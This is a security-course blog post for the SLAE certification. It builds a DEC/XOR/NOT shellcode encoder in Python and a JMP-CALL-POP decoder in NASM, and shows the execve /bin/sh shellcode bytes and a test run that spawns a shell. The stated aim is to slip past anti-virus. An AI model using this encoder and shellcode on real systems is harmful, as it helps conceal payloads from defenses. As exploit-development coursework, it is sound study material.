---
layout: post
title: Linux x86 Custom Encoder
tags: [slae]
---

For the fourth assignment on the SLAE we're asked to create a custom encoder. Encoders are used to aid in masking your true shellcode to help bypass protections that may be in place, like an anti-virus. There are many ways to do this with various techniques. For my encoder I decided to chain a few different simple techniques to encode and decode our shellcode. The encoder will first decrement the individual bytes in the shellcode by 1, XOR it with 0xaa, and finally perform a NOT operation on itself. To accomplish this, a simple python script was created.

```python
#!/usr/env/python3

# XOR, DEC, NOT shellcode encoder

shellcode = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# intialize variables
encoded_shellcode = ""
encoded_nasm = ""

for x in bytearray(shellcode) :
	
	# DEC
	x = x - 0x01
	
	# XOR with OxAA 	
	y = x^0xAA
	
	# NOT encode
	z = ~y
	
	# shellcode format with \x
	encoded_shellcode += "\\x"
	
	# hex format with AND operation for 2's complement
	encoded_shellcode += "%02x" %(z & 0xff)

	# shellcode format for pasting in nasm file
	encoded_nasm += "0x"
	encoded_nasm += "%02x," %(z & 0xff)


print('Encoded shellcode:')
print(encoded_shellcode)

print('Shellcode for nasm:')
print(encoded_nasm)

print('Shellcode Length: %d' % len(bytearray(shellcode)))
``` 

The shellcode used for testing our encoding will simply execute `/bin/sh` using the execve-stack method. The assembly for that looks like such:

```nasm
global _start			

section .text
_start:

	xor eax, eax		; clear eax
	push eax		; NULL
	push 0x68732f2f		; "hs//"
	push 0x6e69622f		; "nib/"
	mov ebx, esp		; point ebx to stack
	push eax		; NULL
	mov edx, esp		; point edx to stack
	push ebx		; push /bin/sh address to stack
	mov ecx, esp		; point ecx to stack
	mov al, 11		; execve()
	int 0x80		; call execve

``` 

Let's run the python encoder.

```
absolomb@ubuntu:~/SLAE/assignments/4$ python3 encoder.py
Encoded shellcode:
\x65\xea\x1a\x32\x7b\x7b\x27\x32\x32\x7b\x34\x3d\x38\xdd\xb7\x1a\xdd\xb4\x07\xdd\xb5\xfa\x5f\x99\x2a
Shellcode for nasm:
0x65,0xea,0x1a,0x32,0x7b,0x7b,0x27,0x32,0x32,0x7b,0x34,0x3d,0x38,0xdd,0xb7,0x1a,0xdd,0xb4,0x07,0xdd,0xb5,0xfa,0x5f,0x99,0x2a,
Shellcode Length: 25
```

Now that we have our encoded shellcode we'll need to setup our decoder in assembly. We'll need to reverse the operations of our python script which means we'll first need to perform the NOT operation, then XOR, and finally INC. 

To accomplish our decoding we'll be utilizing the JMP-CALL-POP technique. The JMP will go down to our encoded shellcode and CALL our decoder_setup. The CALL will also push the next instruction to the stack, which happens to be the location of our encoded shellcode. This allows us to simply POP our encoded shellcode into ESI and start decoding it.

We'll also be using a marker (0xaa) to signify the end of our shellcode so we know when to stop decoding. To find our marker we'll do a simple compare to check if the marker matches the current byte we're trying to decode. If it does match, we know the decoding is finished and we can jump to our decoded shellcode. 

```nasm
global _start			

section .text
_start:

	jmp short call_shellcode

decoder_setup:

	pop esi			; pop shellcode into esi

decode:

	cmp byte [esi], 0xAA	; compare current esi byte with our 0xaa marker
	jz shellcode		; if compare succeeds, jump to shellcode
	not byte [esi]		; NOT operation of current byte in esi
	xor byte [esi], 0xAA	; XOR with 0xaa
	inc byte [esi]		; increment by 1
	inc esi			; move to next byte in esi
	jmp short decode	; jump back to start of decode

call_shellcode:

	call decoder_setup	; pushes shellcode to stack and jumps to decoder_setup

	shellcode: db 0x65,0xea,0x1a,0x32,0x7b,0x7b,0x27,0x32,0x32,0x7b,0x34,0x3d,0x38,0xdd,0xb7,0x1a,0xdd,0xb4,0x07,0xdd,0xb5,0xfa,0x5f,0x99,0x2a, 0xaa
```

Now to compile and extract the shellcode. 

```
absolomb@ubuntu:~/SLAE/assignments/4$ ./compile.sh decoder2
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
absolomb@ubuntu:~/SLAE/assignments/4$ for i in $(objdump -d decoder |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
\xeb\x10\x5e\x80\x3e\xaa\x74\x0f\xf6\x16\x80\x36\xaa\xfe\x06\x46\xeb\xf1\xe8\xeb\xff\xff\xff\x65\xea\x1a\x32\x7b\x7b\x27\x32\x32\x7b\x34\x3d\x38\xdd\xb7\x1a\xdd\xb4\x07\xdd\xb5\xfa\x5f\x99\x2a\xaa
```

Once again we'll be using a simple C wrapper to execute our shellcode.

```
absolomb@ubuntu:~/SLAE/assignments/4$ vim shellcode.c
absolomb@ubuntu:~/SLAE/assignments/4$ gcc shellcode.c -o shellcode -fno-stack-protector -z execstack

absolomb@ubuntu:~/SLAE/assignments/4$ ./shellcode
Shellcode Length:  49
$ id
uid=1000(absolomb) gid=1000(absolomb) groups=1000(absolomb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```

Decoder successful! Our shellcode nearly doubled in length but overall not too bad.

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1208

Github Repo: <https://github.com/absolomb/SLAE>